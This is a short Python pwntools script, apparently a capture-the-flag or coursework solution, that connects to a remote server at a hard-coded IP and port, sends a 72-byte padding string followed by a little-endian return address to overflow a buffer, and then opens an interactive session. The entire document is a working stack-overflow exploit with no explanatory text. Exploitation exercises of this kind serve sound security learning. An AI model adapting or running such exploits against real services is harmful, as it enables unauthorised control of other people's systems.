from pwn import *

# To connect to tcp server
p = remote('140.113.207.240', 8834)

#72bytes, address is 0x4011b6 (readelf -s tp)
p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+"\xb6\x11@\x00")
p.interactive()
